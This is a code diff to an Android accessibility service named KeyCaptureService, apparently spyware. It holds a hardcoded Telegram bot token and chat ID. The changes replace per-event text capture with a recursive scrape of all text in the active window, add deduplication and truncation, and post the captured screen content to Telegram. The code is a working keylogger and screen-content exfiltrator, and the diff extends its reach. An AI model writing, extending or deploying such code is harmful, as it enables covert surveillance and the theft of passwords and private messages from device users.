@@ -2,39 +2,59 @@ package com.example.myeye;
 
 import android.accessibilityservice.AccessibilityService;
 import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
 import android.util.Log;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
-import java.util.List;
+import java.util.HashSet;
+import java.util.Set;
 
 public class KeyCaptureService extends AccessibilityService {
 
     private static final String TAG = "KeyCaptureService";
     private static final String BOT_TOKEN = "8114361873:AAFmtl8vD0Vo7CZvkVmwnjcZZxtzvZXqguY";
     private static final String CHAT_ID = "5022620385";
+    
+    // Prevents spamming duplicate text lines repeatedly
+    private String lastSentText = "";
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         try {
             if (event == null) return;
 
-            int eventType = event.getEventType();
-            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
-                List<CharSequence> textList = event.getText();
-                if (textList != null && !textList.isEmpty()) {
-                    CharSequence textSeq = textList.get(0);
-                    if (textSeq != null) {
-                        String capturedText = textSeq.toString().trim();
-                        if (!capturedText.isEmpty()) {
-                            sendToTelegram(capturedText);
-                        }
-                    }
+            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+            if (rootNode != null) {
+                StringBuilder screenText = new StringBuilder();
+                extractTextRecursive(rootNode, screenText);
+                rootNode.recycle();
+
+                String captured = screenText.toString().trim();
+                if (!captured.isEmpty() && !captured.equals(lastSentText) && captured.length() > 2) {
+                    lastSentText = captured;
+                    sendToTelegram(captured);
                 }
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error processing event", e);
+            Log.e(TAG, "Error in accessibility event", e);
+        }
+    }
+
+    private void extractTextRecursive(AccessibilityNodeInfo node, StringBuilder builder) {
+        if (node == null) return;
+
+        if (node.getText() != null) {
+            builder.append(node.getText().toString()).append(" ");
+        }
+
+        for (int i = 0; i < node.getChildCount(); i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            extractTextRecursive(child, builder);
+            if (child != null) {
+                child.recycle();
+            }
         }
     }
 
@@ -55,11 +75,17 @@ public class KeyCaptureService extends AccessibilityService {
                     conn.setRequestMethod("POST");
                     conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                     conn.setRequestProperty("Accept", "application/json");
-                    conn.setConnectTimeout(4000);
-                    conn.setReadTimeout(4000);
+                    conn.setConnectTimeout(5000);
+                    conn.setReadTimeout(5000);
                     conn.setDoOutput(true);
 
-                    String sanitizedMessage = message.replace("\"", "\\\"");
+                    // Truncate if message is too long for Telegram
+                    String safeMessage = message;
+                    if (safeMessage.length() > 3500) {
+                        safeMessage = safeMessage.substring(0, 3500);
+                    }
+
+                    String sanitizedMessage = safeMessage.replace("\"", "\\\"").replace("\n", " ");
                     String jsonInputString = "{\"chat_id\":\"" + CHAT_ID + "\", \"text\":\"" + sanitizedMessage + "\"}";
 
                     try (OutputStream os = conn.getOutputStream()) {
